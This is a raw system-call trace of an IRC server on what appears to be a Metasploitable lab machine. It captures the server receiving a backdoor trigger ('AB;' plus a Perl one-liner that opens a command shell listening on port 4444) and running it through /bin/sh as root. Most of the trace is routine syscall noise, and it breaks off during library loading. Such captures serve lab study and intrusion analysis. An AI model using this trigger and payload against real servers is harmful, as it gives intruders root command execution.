4519  07:08:43.166534 select(1024, [2 3 4 7 9], [], NULL, {0, 570000}) = 1 (in [4], left {0, 420000})
4519  07:08:43.312160 clock_gettime(CLOCK_MONOTONIC, {933, 129182219}) = 0
4519  07:08:43.312184 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:08:43.312217 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312236 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312251 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312265 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312279 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312293 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312307 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312321 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312334 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312348 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312361 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312375 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312388 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312402 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312416 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312429 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312443 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312456 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312470 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312484 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312498 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312511 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.312571 gettimeofday({1495624123, 312576}, NULL) = 0
4519  07:08:43.312599 select(1024, [2 3 4 5 6 7 9], [6], NULL, {1, 0}) = 1 (out [6], left {1, 0})
4519  07:08:43.312652 clock_gettime(CLOCK_MONOTONIC, {933, 129665135}) = 0
4519  07:08:43.312665 send(6, ":bot1!bot1@Test-CAD1B1ED PRIVMSG #testit :ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\r\n", 96, 0) = 96
4519  07:08:43.312720 time(NULL)        = 1495624123
4519  07:08:43.312733 time(NULL)        = 1495624123
4519  07:08:43.312751 gettimeofday({1495624123, 312755}, NULL) = 0
4519  07:08:43.312762 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:08:43.312791 clock_gettime(CLOCK_MONOTONIC, {933, 129804269}) = 0
4519  07:08:43.312802 gettimeofday({1495624123, 312805}, NULL) = 0
4519  07:08:43.312812 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 980000})
4519  07:08:43.334553 clock_gettime(CLOCK_MONOTONIC, {933, 151573645}) = 0
4519  07:08:43.334574 accept(2, 0, NULL) = 8
4519  07:08:43.334594 getpeername(8, {sa_family=AF_INET, sin_port=htons(40129), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:08:43.334641 fcntl64(8, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:08:43.334655 fcntl64(8, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:08:43.334668 setsockopt(8, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:08:43.334681 setsockopt(8, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:08:43.334692 setsockopt(8, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:08:43.334703 getsockopt(8, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:08:43.334716 setsockopt(8, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:08:43.334733 clock_gettime(CLOCK_MONOTONIC, {933, 151746530}) = 0
4519  07:08:43.334745 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 10
4519  07:08:43.334767 fcntl64(10, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:08:43.334899 fcntl64(10, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:08:43.334910 fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
4519  07:08:43.334921 connect(10, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:08:43.334938 send(10, "\330\327\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:08:43.335039 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:08:43.335065 gettimeofday({1495624123, 335070}, NULL) = 0
4519  07:08:43.335079 select(1024, [2 3 4 5 6 7 9 10], [], NULL, {1, 0}) = 1 (in [10], left {1, 0})
4519  07:08:43.338697 clock_gettime(CLOCK_MONOTONIC, {933, 155731884}) = 0
4519  07:08:43.338746 recvfrom(10, "\330\327\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\361\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:08:43.338790 close(10)         = 0
4519  07:08:43.338806 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:08:43.338821 send(8, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:08:43.338881 time(NULL)        = 1495624123
4519  07:08:43.338894 time(NULL)        = 1495624123
4519  07:08:43.338923 gettimeofday({1495624123, 338927}, NULL) = 0
4519  07:08:43.338952 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:08:43.338982 clock_gettime(CLOCK_MONOTONIC, {933, 156028829}) = 0
4519  07:08:43.339027 gettimeofday({1495624123, 339031}, NULL) = 0
4519  07:08:43.339039 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 750000})
4519  07:08:43.582960 clock_gettime(CLOCK_MONOTONIC, {933, 400004135}) = 0
4519  07:08:43.583041 recv(9, "PRIVMSG  #testit3 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:08:43.583091 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583123 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583148 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583166 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583180 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583194 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583207 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583221 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583234 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583247 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583260 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583274 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583287 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583300 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583313 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583327 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583340 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583353 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583367 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583381 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583407 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583457 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 80000}, ...}) = 0
4519  07:08:43.583489 gettimeofday({1495624123, 583492}, NULL) = 0
4519  07:08:43.583501 select(1024, [2 3 4 5 6 7 8 9], [], NULL, {1, 0}) = 1 (in [8], left {1, 0})
4519  07:08:43.583543 clock_gettime(CLOCK_MONOTONIC, {933, 400569727}) = 0
4519  07:08:43.583569 recv(8, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:08:43.583597 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:08:43.583617 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:08:43.583629 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:08:43.583643 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 5350
5350  07:08:43.583716 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
5350  07:08:43.583730 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
5350  07:08:43.583741 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.583754 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
5350  07:08:43.583863 brk(0)            = 0x80f9000
5350  07:08:43.583884 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.583913 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f11000
5350  07:08:43.583957 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.583976 open("/etc/ld.so.cache", O_RDONLY) = 1
5350  07:08:43.584003 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5350  07:08:43.584022 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f09000
5350  07:08:43.584032 close(1)          = 0
5350  07:08:43.584042 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.584057 open("/lib/libncurses.so.5", O_RDONLY) = 1
5350  07:08:43.584070 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
5350  07:08:43.584163 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
5350  07:08:43.584180 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed9000
5350  07:08:43.584192 mmap2(0xb7f06000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f06000
5350  07:08:43.584209 close(1)          = 0
5350  07:08:43.584220 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.584234 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5350  07:08:43.584248 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5350  07:08:43.584340 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5350  07:08:43.584357 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed5000
5350  07:08:43.584368 mmap2(0xb7ed7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ed7000
5350  07:08:43.584383 close(1)          = 0
5350  07:08:43.584405 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.584420 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5350  07:08:43.584461 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5350  07:08:43.584564 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5350  07:08:43.584581 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed4000
5350  07:08:43.584595 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d85000
5350  07:08:43.584605 mmap2(0xb7ece000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ece000
5350  07:08:43.584620 mmap2(0xb7ed1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ed1000
5350  07:08:43.584633 close(1)          = 0
5350  07:08:43.584655 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d84000
5350  07:08:43.584667 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d846b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5350  07:08:43.584721 mprotect(0xb7ece000, 4096, PROT_READ) = 0
5350  07:08:43.584756 munmap(0xb7f09000, 29913) = 0
5350  07:08:43.584781 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.584795 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
5350  07:08:43.584814 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9a9360) = -1 ENOTTY (Inappropriate ioctl for device)
5350  07:08:43.584847 brk(0)            = 0x80f9000
5350  07:08:43.584857 brk(0x80fa000)    = 0x80fa000
5350  07:08:43.584868 brk(0x80fb000)    = 0x80fb000
5350  07:08:43.584884 getuid32()        = 0
5350  07:08:43.584927 getgid32()        = 0
5350  07:08:43.584937 geteuid32()       = 0
5350  07:08:43.584946 getegid32()       = 0
5350  07:08:43.584976 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.584990 time(NULL)        = 1495624123
5350  07:08:43.585003 brk(0x80fc000)    = 0x80fc000
5350  07:08:43.585018 brk(0x80fd000)    = 0x80fd000
5350  07:08:43.585036 open("/proc/meminfo", O_RDONLY) = 1
5350  07:08:43.585058 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
5350  07:08:43.585075 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f10000
5350  07:08:43.585086 read(1, "MemTotal:      1035240 kB\nMemFree:        655348 kB\nBuffers:         63144 kB\nCached:         161800 kB\nSwapCached:          0 kB\nActive:         251568 kB\nInactive:       102296 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        655108 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5412 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            14656 kB\nSReclaimable:     6772 kB\nSUnreclaim:       7884 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
5350  07:08:43.585169 close(1)          = 0
5350  07:08:43.585180 munmap(0xb7f10000, 4096) = 0
5350  07:08:43.585192 brk(0x80fe000)    = 0x80fe000
5350  07:08:43.585217 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5350  07:08:43.585230 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
5350  07:08:43.585242 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5350  07:08:43.585254 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5350  07:08:43.585266 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
5350  07:08:43.585277 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
5350  07:08:43.585291 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.585302 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5350  07:08:43.585315 uname({sys="Linux", node="metasploitable", ...}) = 0
5350  07:08:43.585362 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5350  07:08:43.585380 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5350  07:08:43.585409 brk(0x8100000)    = 0x8100000
5350  07:08:43.585449 getcwd("/etc/unreal", 4096) = 12
5350  07:08:43.585464 getpid()          = 5350
5350  07:08:43.585494 getppid()         = 4519
5350  07:08:43.585509 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5350  07:08:43.585528 stat64("/sbin/sh", 0xbf9a9338) = -1 ENOENT (No such file or directory)
5350  07:08:43.585541 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5350  07:08:43.585558 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
5350  07:08:43.585581 socket(PF_FILE, SOCK_STREAM, 0) = 1
5350  07:08:43.585594 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5350  07:08:43.585606 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5350  07:08:43.585627 close(1)          = 0
5350  07:08:43.585639 socket(PF_FILE, SOCK_STREAM, 0) = 1
5350  07:08:43.585649 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
5350  07:08:43.585659 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
5350  07:08:43.585676 close(1)          = 0
5350  07:08:43.585690 open("/etc/nsswitch.conf", O_RDONLY) = 1
5350  07:08:43.585704 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5350  07:08:43.585720 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f10000
5350  07:08:43.585731 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5350  07:08:43.585782 read(1, "", 4096) = 0
5350  07:08:43.585792 close(1)          = 0
5350  07:08:43.585801 munmap(0xb7f10000, 4096) = 0
5350  07:08:43.585817 open("/etc/ld.so.cache", O_RDONLY) = 1
5350  07:08:43.585829 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5350  07:08:43.585845 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f09000
5350  07:08:43.585855 close(1)          = 0
5350  07:08:43.585865 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.585879 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
5350  07:08:43.585906 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 